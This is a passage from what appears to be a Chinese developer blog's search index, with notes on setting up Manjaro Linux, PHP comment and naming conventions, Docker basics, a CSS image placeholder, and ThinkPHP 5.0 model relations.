    <url>/2018/10/01/%E3%80%90linux%E3%80%91linux%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85-%E5%AE%89%E8%A3%85manjaro/</url>
    <content><![CDATA[<h4 id="1-制作U盘启动"><a href="#1-制作U盘启动" class="headerlink" title="1 制作U盘启动"></a>1 制作U盘启动</h4><ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9ydWZ1cy5ha2VvLmllLw==" title="https://rufus.akeo.ie/">Rufus官网<i class="fa fa-external-link"></i></span>下载U盘制作工具。</li>
<li>从<span class="exturl" data-url="aHR0cHM6Ly9taXJyb3JzLnR1bmEudHNpbmdodWEuZWR1LmNuL21hbmphcm8tY2Qv" title="https://mirrors.tuna.tsinghua.edu.cn/manjaro-cd/">清华镜像<i class="fa fa-external-link"></i></span>下载镜像文件，根据自己芯片架构选择版本。<a id="more"></a>
</li>
</ul>
<h4 id="2-镜像制作"><a href="#2-镜像制作" class="headerlink" title="2 镜像制作"></a>2 镜像制作</h4><ul>
<li>本地将U盘FAT32格式。，</li>
<li>打开镜像制作工具选择U盘，导入镜像。</li>
<li>U盘制作工具选择DD模式制作。</li>
<li>开始制作。</li>
</ul>
<h4 id="3-安装系统"><a href="#3-安装系统" class="headerlink" title="3 安装系统"></a>3 安装系统</h4><ul>
<li>接入U盘，开机按F12（有些可能是F8），U盘启动。</li>
<li>进入到manjaro向导页面。根据提示自己设置。</li>
<li>最后选中manjaro启动，回车进入系统安装配置界面。</li>
<li>如要安装timeshift快照工具，就要分出一个空白区。用于存放快照并挂载到系统中，如<code>/home/snapshot</code></li>
<li>根据提示按照自己的需求来选择，并完成了本次的系统安装过程。</li>
</ul>
<h4 id="4-安装manjaro其它版本"><a href="#4-安装manjaro其它版本" class="headerlink" title="4 安装manjaro其它版本"></a>4 安装manjaro其它版本</h4><ul>
<li>安过程基本同上。追求性能就xfce版本，追求现代化桌面就gnome，界面好看也吃内存。</li>
</ul>
<h4 id="5-改为国内源"><a href="#5-改为国内源" class="headerlink" title="5 改为国内源"></a>5 改为国内源</h4><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">sudo pacman-mirrors -i -c China -m rank  <span class="comment"># 选择项会写入/etc/pacman.d/mirrorlist</span></span><br><span class="line">   sudo <span class="built_in">echo</span> -e <span class="string">"[archlinuxcn]\nServer =  https://mirrors.shu.edu.cn/archlinuxcn/<span class="variable">$arch</span>"</span> &gt;&gt; /etc/pacman.conf <span class="comment">#配置软件源</span></span><br><span class="line">   sudo pacman -Syyu <span class="comment"># 更新</span></span><br><span class="line">   sudo  pacman -S archlinuxcn-keyring</span><br><span class="line">   sudo pacman -Syy</span><br></pre></td></tr></table></figure></div>
<h4 id="6-更新到GLIBC-2-28"><a href="#6-更新到GLIBC-2-28" class="headerlink" title="6 更新到GLIBC_2.28"></a>6 更新到GLIBC_2.28</h4><p><code>GLIBC_2.28</code>是较新的版本，很软件都要依赖它，不然启动不了。<br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">sudo strings /lib64/libc.so.6 | grep GLIBC_ <span class="comment">#查看本地GLIBC版本，已经有的版本库没有到2.28就安装更新</span></span><br><span class="line">sudo pacman -S glibc lib32-glibc --force 直接安装</span><br></pre></td></tr></table></figure></div></p>
<p>GLIBC_2.28更新可参考<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0hEMmtpbGxlcnMvYXJ0aWNsZS9kZXRhaWxzLzgxMTYzMTY2" title="https://blog.csdn.net/HD2killers/article/details/81163166">Linux(manjaro)安装glibc指定版本<i class="fa fa-external-link"></i></span></p>
<h4 id="7-安装timeshift"><a href="#7-安装timeshift" class="headerlink" title="7 安装timeshift"></a>7 安装timeshift</h4><p>安装tiemshift。以便于备份回滚，不过存放快照的地方要新建一个空白分区用于存放快照。<br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">sudo pacamn -S timeshift</span><br></pre></td></tr></table></figure></div></p>
<h4 id="8-更新pacman并安装yaourt"><a href="#8-更新pacman并安装yaourt" class="headerlink" title="8 更新pacman并安装yaourt"></a>8 更新pacman并安装yaourt</h4><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S  yaourt</span><br></pre></td></tr></table></figure></div>
<h4 id="9-安装常用软件"><a href="#9-安装常用软件" class="headerlink" title="9 安装常用软件"></a>9 安装常用软件</h4><ul>
<li>tim <code>sudo yaourt -S deepin.com.qq.offic</code> community源。</li>
<li>qq <code>sudo yaourt -S deepin.com.qq.im</code>。</li>
<li>wps <code>pacman -S wps-office ttf-wps-fonts</code>。</li>
<li>chrome <code>sudo pacman -S chromium</code> community源。</li>
<li>网易音乐 <code>sudo pacman -S netease-cloud-music</code>。<h4 id="10-五笔输入法"><a href="#10-五笔输入法" class="headerlink" title="10 五笔输入法"></a>10 五笔输入法</h4></li>
<li><code>sudo pacman -S fcitx fcitx-im fcitx-configtool</code></li>
<li>编辑 ~/.xprofile<div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#fcitx</span></span><br><span class="line"><span class="built_in">export</span> GTK_IM_MODULE=fcitx </span><br><span class="line"><span class="built_in">export</span> QT_IM_MODULE=fcitx </span><br><span class="line"><span class="built_in">export</span> XMODIFIERS=<span class="string">"@im=fcitx"</span></span><br></pre></td></tr></table></figure></div>
</li>
</ul>
<ul>
<li>根据提示配置下后重新启动下输入法</li>
<li><span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvaW5kZXgucGhwL0ZjaXR4" title="https://wiki.archlinux.org/index.php/Fcitx">参考资料<i class="fa fa-external-link"></i></span></li>
</ul>
<h4 id="11-修复tim不能输入汉字问题"><a href="#11-修复tim不能输入汉字问题" class="headerlink" title="11 修复tim不能输入汉字问题"></a>11 修复tim不能输入汉字问题</h4><p>在/opt/deepinwine/apps/Deepin-TIM/run.sh中加入<br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> GTK_IM_MODULE=fcitx</span><br><span class="line"><span class="built_in">export</span> QT_IM_MODULE=fcitx</span><br><span class="line"><span class="built_in">export</span> XMODIFIERS=<span class="string">"@im=fcitx"</span></span><br></pre></td></tr></table></figure></div></p>
<p>重启tim就行了,<span class="exturl" data-url="aHR0cDovL2Jsb2cuc2NpZW5jZW5ldC5jbi9ibG9nLTExNzQxMi0xMTM3MjUxLmh0bWw=" title="http://blog.sciencenet.cn/blog-117412-1137251.html">参考资料<i class="fa fa-external-link"></i></span></p>
<h4 id="12-安装字体"><a href="#12-安装字体" class="headerlink" title="12  安装字体"></a>12  安装字体</h4><ul>
<li>查找你要安装的字体 <code>pacman -Ss font</code>，然后安装如<code>sudo pacman -S extra/ttf-dejavu</code> </li>
<li><code>fc-cache -vf</code>  更新字体缓存</li>
<li>[官方说明文档]（<span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvaW5kZXgucGhwL0ZvbnRz77yJ" title="https://wiki.archlinux.org/index.php/Fonts）">https://wiki.archlinux.org/index.php/Fonts）<i class="fa fa-external-link"></i></span></li>
<li><code>sudo pacman  -Sy ttf-google-fonts-git</code>大字体</li>
</ul>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>manjaro</tag>
      </tags>
  </entry>
  <entry>
    <title>「php」php笔记-PHP注释语法规范和命名规范(转载)</title>
    <url>/2018/10/01/%E3%80%90php%E3%80%91php%E7%AC%94%E8%AE%B0-PHP%E6%B3%A8%E9%87%8A%E8%AF%AD%E6%B3%95%E8%A7%84%E8%8C%83%E5%92%8C%E5%91%BD%E5%90%8D%E8%A7%84%E8%8C%83/</url>
    <content><![CDATA[<h2 id="PHP注释规范"><a href="#PHP注释规范" class="headerlink" title="PHP注释规范"></a>PHP注释规范</h2><div class="note info">
            <p>注释在写代码的过程中非常重要，好的注释能让你的代码读起来更轻松，在写代码的时候一定要注意注释的规范。</p>
          </div>
<h2 id="php里面常见的几种注释方式："><a href="#php里面常见的几种注释方式：" class="headerlink" title="php里面常见的几种注释方式："></a>php里面常见的几种注释方式：</h2><p>  &emsp;1.文件的注释，介绍文件名，功能以及作者版本号等信息。<br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 文件名简单介绍</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 文件功能</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>  作者</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span>  版本号</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span>  2020-02-02</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure></div></p>
<p>2.类的注释，类名及介绍。<br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 函数的含义说明</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span>  public </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>  作者</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> mixed $arg1  参数一的说明 </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> mixed $arg2  参数二的说明</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> array  返回类型</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span>  2020-02-02</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure></div></p>
<h2 id="PHP命名规范"><a href="#PHP命名规范" class="headerlink" title="PHP命名规范"></a>PHP命名规范</h2><p><strong>1.目录和文件</strong></p>
<blockquote>
<ul>
<li>目录使用小写+下划线</li>
<li>类库，函数文件统一以.php为后缀</li>
<li>类的文件名均以命名空间定义，并且命名空间的路径和类库文件所在路径一致</li>
<li>类文件采用驼峰法命名（首字母大写），其他文件采用小写+下划线命名</li>
<li>类名和类文件名保持一致，统一采用驼峰法（首字母大写）</li>
</ul>
</blockquote>
<hr>
<p><strong>2.函数和类，属性命名</strong></p>
<blockquote>
<ul>
<li>类的命名采用驼峰法（首字母大写），例如 User、UserType，默认不需要添加后缀，例如UserController应该直接命名为User</li>
<li>函数的命名使用小写字母和下划线（小写字母开头）的方式，例如 get_client_ip</li>
<li>方法的命名使用驼峰法（首字母小写），例如 getUserName(如果方法有返回值，那么目前习惯上将首字母用小写的属性类型，如s(string)，i(int)，f(float)，b(boolean)，a(array)等)</li>
<li>属性的命名使用驼峰法（首字母小写），例如 tableName、instance（目前习惯上将首字母用小写的属性类型，如s(string)，i(int)，f(float)，b(boolean)，a(array)等）</li>
<li>以双下划线“<strong>”打头的函数或方法作为魔法方法，例如 </strong>call 和 __autoload</li>
</ul>
</blockquote>
<hr>
<p><strong>3.常量和配置</strong></p>
<blockquote>
<ul>
<li>常量以大写字母和下划线命名，例如 APP_PATH和 THINK_PATH</li>
<li>配置参数以小写字母和下划线命名，例如 url_route_on 和url_convert</li>
</ul>
</blockquote>
<hr>
<p>4.数据表字段</p>
<blockquote>
<ul>
<li>数据表和字段采用小写加下划线方式命名，并注意字段名不要以下划线开头，例如 think_user 表和 user_name字段，不建议使用驼峰和中文作为数据表字段命名。</li>
</ul>
</blockquote>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dodWNhb2RpL2FydGljbGUvZGV0YWlscy81OTEwNDI5Nw==" title="https://blog.csdn.net/whucaodi/article/details/59104297">文章来源<i class="fa fa-external-link"></i></span></p>
]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>PSR规范</tag>
      </tags>
  </entry>
  <entry>
    <title>【Docker】初级篇-认识docker</title>
    <url>/2018/08/22/%E3%80%90linux%E3%80%91Docker%E7%AC%94%E8%AE%B0-%E4%BB%80%E4%B9%88%E6%98%AFdocker/</url>
    <content><![CDATA[<h4 id="1-什么是docker"><a href="#1-什么是docker" class="headerlink" title="1 什么是docker?"></a>1 什么是docker?</h4><p>&emsp;<code>Docker</code>是一种将应用和相关联依赖集装打包到容器中隔离运行的技术。<code>Docker</code>的出现带来了许多改变，比如：</p>
<h4 id="2-DevOps解决方案"><a href="#2-DevOps解决方案" class="headerlink" title="2 DevOps解决方案"></a>2 DevOps解决方案</h4><p> &emsp;<code>Docker</code>是应用开发、打包和布署的标准化环境解决方案。由于开发到生产环境是一致，可以实现自动化部署省去大量重复运维成本。从开发、测试、打包到部署上线自动化流水线模式。使用拥抱变化的开发人员和坚守稳定的运维人员找到彼此共同的语言。</p>
<h4 id="3-高性能虚拟化"><a href="#3-高性能虚拟化" class="headerlink" title="3 高性能虚拟化"></a>3 高性能虚拟化</h4><p>   &emsp;相对常见的单机虚拟化，这种硬件级虚拟化。那么<code>Docker</code>可以看作是基于内核级虚拟化，同一系统所有容器共享同一内核。在运行同样多的应用，并要求隔离的前提下。多系统虚拟化要为每一个应用虚拟一个系统出来，而<code>Docker</code>则共用一个来说。<code>Docker</code>会高性能得多。<br>   <img src="/images/20181314docker-container.png" alt="高性能docker"><br>&emsp;<code>Docker</code>是一个应用容器引擎，容器间沙箱隔离运行。将开发的应用、环境、配置、依赖等等放入可移植容器中开发和运行，并打包迁机快速布署。是一个devOps工具，由于开发交付快速过渡到布署上线的解决方案。方便快捷是Docker最大的优势。</p>
<h4 id="4-快速迁移布署"><a href="#4-快速迁移布署" class="headerlink" title="4 快速迁移布署"></a>4 快速迁移布署</h4><p>  &emsp;在编排配置文件和镜像配置文件写好项目的所需要的依赖环境后，快速把项目迁移到主机上，并自动化构建项目原来的环境并让项目跑起来。</p>
<h4 id="5-透明化管理"><a href="#5-透明化管理" class="headerlink" title="5 透明化管理"></a>5 透明化管理</h4><p>   &emsp;镜像透明化：镜像可以通过<code>Dockerfile</code>配置文件构建，任何的修改增加都是透明化。容器编排透明化，容器的启动顺序、网络IO、文件挂载等等都可通过配置后交给容器编排工具自动化处理。</p>
<h4 id="6-开发持续集成，项目持续交付"><a href="#6-开发持续集成，项目持续交付" class="headerlink" title="6 开发持续集成，项目持续交付"></a>6 开发持续集成，项目持续交付</h4><p>  &emsp;多人开发完项目新功能后台集成起来，测试通过后，提交代码并<code>webhook</code>给线上，让它自动构建并运行项目容器，快速自动迭代项目。</p>
<h4 id="3-镜像加速"><a href="#3-镜像加速" class="headerlink" title="3 镜像加速"></a>3 镜像加速</h4><p>  &emsp;<code>Docker</code>中国镜像加速。修改<code>/etc/docker/deamo.json</code>,并将镜像地址定到<code>registry-mirrors</code>键值;<br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">"registry-mirrors"</span>: [<span class="string">"https://registry.docker-cn.com"</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></p>
<p>并重启<code>dokcer</code>, <span class="exturl" data-url="aHR0cHM6Ly93d3cuZG9ja2VyLWNuLmNvbS9yZWdpc3RyeS1taXJyb3I=" title="https://www.docker-cn.com/registry-mirror">docker官方中文文档<i class="fa fa-external-link"></i></span></p>
]]></content>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>css图片占位</title>
    <url>/2018/08/11/css%E5%9B%BE%E7%89%87%E5%8D%A0%E4%BD%8D/</url>
    <content><![CDATA[<div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="CSS"><figure class="iseeu highlight /css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">img</span> &#123;</span><br><span class="line">    <span class="attribute">position</span>: relative;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">img</span><span class="selector-pseudo">::after</span> &#123;</span><br><span class="line">    <span class="attribute">content</span>: <span class="string">""</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">100%</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">background</span>: <span class="built_in">url</span>(iphonex.png ) no-repeat center;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
]]></content>
      <tags>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title>「php」php数处理类</title>
    <url>/2018/08/09/%E3%80%90php%E3%80%91php%E6%95%B0%E5%A4%84%E7%90%86%E7%B1%BB/</url>
    <content><![CDATA[<div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@info</span>     在指定的范围内，指定输出数量中，输出指定的数以及相邻的几个数字</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 	  string</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">generateList</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        $currentPage = <span class="number">10</span>; <span class="comment">//当前数字</span></span><br><span class="line">        $total       =  <span class="number">100</span>; <span class="comment">//数字的范围</span></span><br><span class="line">        $uplimit    = <span class="number">5</span>;<span class="comment">//游标容量上限,多少个值</span></span><br><span class="line">        $limit      = $total &gt;= $uplimit ? $uplimit : $total;</span><br><span class="line">        $centerLimit  = floor($limit/<span class="number">2</span>); <span class="comment">//游标中心</span></span><br><span class="line">        $pageListHtml = $currentPage;</span><br><span class="line">        $frontPageNum = <span class="number">0</span>;</span><br><span class="line">        $backPageNum  = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>($i=<span class="number">1</span>;$i&lt;=$limit;$i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>($i &lt;= $centerLimit &amp;&amp; $currentPage &gt; $i)&#123;</span><br><span class="line">                <span class="comment">//尝试向前游标</span></span><br><span class="line">                $frontPageNum++;</span><br><span class="line">                $front  = $currentPage - $frontPageNum;</span><br><span class="line">                $pageListHtml = $front.<span class="string">','</span>.$pageListHtml;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                $backPageNum++;</span><br><span class="line">                <span class="comment">//尝试向后游标</span></span><br><span class="line">                $back   = $currentPage + $backPageNum;</span><br><span class="line">                $pageListHtml .= <span class="string">','</span>.$back;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $pageListHtml;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>
]]></content>
  </entry>
  <entry>
    <title>「php」TP5.0学习笔记-模型和ORM</title>
    <url>/2018/06/29/%E3%80%90php%E3%80%91TP5-0%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%A8%A1%E5%9E%8B%E7%9A%84ORM-Object-Relation-Mapping-%E7%9A%84%E6%80%9D%E6%83%B3/</url>
    <content><![CDATA[<h4 id="1-ORM是什么？跟TP5-0模型有什么关系"><a href="#1-ORM是什么？跟TP5-0模型有什么关系" class="headerlink" title="1.ORM是什么？跟TP5.0模型有什么关系?"></a>1.ORM是什么？跟TP5.0模型有什么关系?</h4><p>&emsp;ORM(Object Relation Mapping)对象映射关系。ORM一种将数据表抽象成对象的编程思想。简单点，可以当成一个数据表对应一个对象，对数据的操作不再看成是对数据表的操作，表与表之间的关系也不再是外键和内键的关系，而是对象与对象的作用关系。<br>&emsp;TP5.0的ORM主要应用在模型中对数据库的操作中。<br><a id="more"></a></p>
<h4 id="2-关联模型"><a href="#2-关联模型" class="headerlink" title="2. 关联模型"></a>2. 关联模型</h4><h5 id="2-1-相对关联模型-内嵌关联模型"><a href="#2-1-相对关联模型-内嵌关联模型" class="headerlink" title="2.1 相对关联模型(内嵌关联模型)"></a>2.1 相对关联模型(内嵌关联模型)</h5><p>1，<strong><em>主模型</em></strong><br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">api</span>\<span class="title">model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Banner</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">bannerItem</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    	<span class="comment">///多对多Banner模型关联BannerItem模型 </span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;hasMany(<span class="string">"BannerItem"</span>,<span class="string">"banner_id"</span>,<span class="string">"id"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></p>
<p>2, <strong><em>关联模型</em></strong><br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">api</span>\<span class="title">model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BannerItem</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Image</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//相对关联</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;BelongsTo(<span class="string">"Image"</span>,<span class="string">"img_id"</span>,<span class="string">"id"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></p>
<p>3，<strong><em>Images模型</em></strong><br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">api</span>\<span class="title">model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Image</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></p>
<p>4，<strong><em>调用</em></strong><br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">api</span>\<span class="title">controller</span>\<span class="title">v1</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">api</span>\<span class="title">model</span>\<span class="title">Banner</span> <span class="title">as</span> <span class="title">BannerModel</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Banner</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBanner</span><span class="params">($id)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//内嵌关联模型调用</span></span><br><span class="line">        $result = BannerModel::get($id,[<span class="string">'BannerItem'</span>,<span class="string">'BannerItem.Image'</span> ]);</span><br><span class="line">        <span class="keyword">return</span> json($result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></p>
<p>5,输出<br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="JSON"><figure class="iseeu highlight /json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"id"</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="attr">"name"</span>: <span class="string">"首页置顶"</span>,</span><br><span class="line">    <span class="attr">"description"</span>: <span class="string">"首页轮播图"</span>,</span><br><span class="line">    <span class="attr">"delete_time"</span>: <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"update_time"</span>: <span class="string">"1970-01-01 08:00:00"</span>,</span><br><span class="line">    <span class="attr">"banner_item"</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">"id"</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="attr">"img_id"</span>: <span class="number">65</span>,</span><br><span class="line">            <span class="attr">"key_word"</span>: <span class="string">"6"</span>,</span><br><span class="line">            <span class="attr">"type"</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="attr">"delete_time"</span>: <span class="literal">null</span>,</span><br><span class="line">            <span class="attr">"banner_id"</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="attr">"update_time"</span>: <span class="string">"1970-01-01 08:00:00"</span>,</span><br><span class="line">            <span class="attr">"image"</span>: &#123;</span><br><span class="line">                <span class="attr">"id"</span>: <span class="number">65</span>,</span><br><span class="line">                <span class="attr">"url"</span>: <span class="string">"/banner-4a.png"</span>,</span><br><span class="line">                <span class="attr">"from"</span>: <span class="number">1</span>,</span><br><span class="line">                <span class="attr">"delete_time"</span>: <span class="literal">null</span>,</span><br><span class="line">                <span class="attr">"update_time"</span>: <span class="string">"1970-01-01 08:00:00"</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">"id"</span>: <span class="number">2</span>,</span><br><span class="line">            <span class="attr">"img_id"</span>: <span class="number">2</span>,</span><br><span class="line">            <span class="attr">"key_word"</span>: <span class="string">"25"</span>,</span><br><span class="line">            <span class="attr">"type"</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="attr">"delete_time"</span>: <span class="literal">null</span>,</span><br><span class="line">            <span class="attr">"banner_id"</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="attr">"update_time"</span>: <span class="string">"1970-01-01 08:00:00"</span>,</span><br><span class="line">            <span class="attr">"image"</span>: &#123;</span><br><span class="line">                <span class="attr">"id"</span>: <span class="number">2</span>,</span><br><span class="line">                <span class="attr">"url"</span>: <span class="string">"/banner-2a.png"</span>,</span><br><span class="line">                <span class="attr">"from"</span>: <span class="number">1</span>,</span><br><span class="line">                <span class="attr">"delete_time"</span>: <span class="literal">null</span>,</span><br><span class="line">                <span class="attr">"update_time"</span>: <span class="string">"1970-01-01 08:00:00"</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">"id"</span>: <span class="number">3</span>,</span><br><span class="line">            <span class="attr">"img_id"</span>: <span class="number">3</span>,</span><br><span class="line">            <span class="attr">"key_word"</span>: <span class="string">"11"</span>,</span><br><span class="line">            <span class="attr">"type"</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="attr">"delete_time"</span>: <span class="literal">null</span>,</span><br><span class="line">            <span class="attr">"banner_id"</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="attr">"update_time"</span>: <span class="string">"1970-01-01 08:00:00"</span>,</span><br><span class="line">            <span class="attr">"image"</span>: &#123;</span><br><span class="line">                <span class="attr">"id"</span>: <span class="number">3</span>,</span><br><span class="line">                <span class="attr">"url"</span>: <span class="string">"/banner-3a.png"</span>,</span><br><span class="line">                <span class="attr">"from"</span>: <span class="number">1</span>,</span><br><span class="line">                <span class="attr">"delete_time"</span>: <span class="literal">null</span>,</span><br><span class="line">                <span class="attr">"update_time"</span>: <span class="string">"1970-01-01 08:00:00"</span></span><br><span class="line">            